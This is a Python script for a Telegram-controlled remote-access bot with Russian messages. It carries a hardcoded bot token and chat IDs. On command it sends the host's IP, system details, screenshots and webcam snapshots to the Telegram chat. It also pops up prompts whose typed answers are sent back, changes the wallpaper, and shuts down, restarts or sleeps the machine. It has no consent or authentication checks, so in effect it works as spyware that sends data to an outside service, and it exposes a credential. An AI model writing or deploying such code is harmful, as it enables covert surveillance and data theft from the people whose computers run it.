import requests
import cv2
import ctypes
import pyautogui as pag
import platform as pf
import os
import telebot
from telebot import types
from telebot import version

token = '5386789204:AAG3pJ7T3dWrn-SsqOWIbPFOtZwLbp7_7-o'
chat_id1 = '744246158'
chat_id = '1455902697'
bot = telebot.TeleBot(token)

requests.post(
    f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=Выбери команду: /ip, /spec, /screenshot, /webcam, /message, /input, /wallpaper, /off, /restart, /sleep")


@bot.message_handler(commands=['start'])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ['/ip', '/spec', '/screenshot', '/webcam',
            '/message', '/input', '/wallpaper', '/off', '/restart', '/sleep']

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))

    bot.send_message(message.chat.id, 'Выберите команду', reply_markup=rmk)


@bot.message_handler(commands=['ip', 'ip_address'])
def ip_address(message):
    response = requests.get('http://jsonip.com/').json()
    bot.send_message(message.chat.id, f'Your ip address: {response["ip"]}')


@bot.message_handler(commands=['spec'])
def spec(message):
    msg = f'Name PC: {pf.node()}\nProcessor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}'
    bot.send_message(message.chat.id, msg)


@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    pag.screenshot('000.jpg')

    with open('000.jpg', 'rb') as img:
        bot.send_photo(message.chat.id, img)


@bot.message_handler(commands=['webcam'])
def webcam(message):
    cap = cv2.VideoCapture(0)

    for i in range(30):
        cap.read()

    ret, frame = cap.read()

    cv2.imwrite('cam.jpg', frame)
    cap.release()

    with open('cam.jpg', 'rb') as img:
        bot.send_photo(message.chat.id, img)


@bot.message_handler(commands=['message'])
def message_sending(message):
    msg = bot.send_message(message.chat.id, 'Введите ваше сообщение')
    bot.register_next_step_handler(msg, next_message_sending)


def next_message_sending(message):
    try:
        pag.alert(message.text, '^')
    except Exception:
        bot.send_message(message.chat.id, 'Что-то пошло не так')


@bot.message_handler(commands=['input'])
def message_sending_with_input(message):
    msg = bot.send_message(message.chat.id, 'Введите ваше сообщение')
    bot.register_next_step_handler(msg, next_message_sending_with_input)


def next_message_sending_with_input(message):
    try:
        answer = pag.prompt(message.text, '^')
        bot.send_message(message.chat.id, answer)
    except Exception:
        bot.send_message(message.chat.id, 'Что-то пошло не так')


@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    msg = bot.send_message(message.chat.id, 'Отправьте картинку или ссылку')
    bot.register_next_step_handler(msg, next_wallpaper)


@bot.message_handler(content_types=['photo'])
def next_wallpaper(message):
    file = message.photo[-1].file_id
    file = bot.get_file(file)
    dfile = bot.download_file(file.file_path)

    with open('image.jpg', 'wb') as img:
        img.write(dfile)

    path = os.path.abspath('image.jpg')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


@bot.message_handler(commands=['off'])
def off(message):
    markup_inline = types.InlineKeyboardMarkup()
    item_yes = types.InlineKeyboardButton(text='Да', callback_data='yes')
    item_no = types.InlineKeyboardButton(text='Нет', callback_data='no')
    markup_inline.add(item_yes, item_no)
    bot.send_message(message.chat.id, 'Выключить ноутбук?', reply_markup=markup_inline)


@bot.callback_query_handler(func=lambda call: True)
def calldata(call):
    if call.data == 'yes':
        os.system("shutdown /p")
    elif call.data == 'no':
        pass


@bot.message_handler(commands=['restart'])
def restart(message):
    markup_inline1 = types.InlineKeyboardMarkup()
    item_yes = types.InlineKeyboardButton(text='Да', callback_data='yesrestart')
    item_no = types.InlineKeyboardButton(text='Нет', callback_data='norestart')
    markup_inline1.add(item_yes, item_no)
    bot.send_message(message.chat.id, 'Перезагрузить ноутбук?', reply_markup=markup_inline1)


@bot.callback_query_handler(func=lambda call: True)
def calldata1(call):
    if call.data == 'yesrestart':
        os.system("shutdown /r /t 00")
    elif call.data == 'norestart':
        pass


@bot.message_handler(commands=['sleep'])
def sleep(message):
    bot.send_message(message.chat.id, 'Переключаю ноутбук в режим сна')
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    bot.send_message(message.chat.id, 'Ноутбук в режиме сна')


bot.polling()
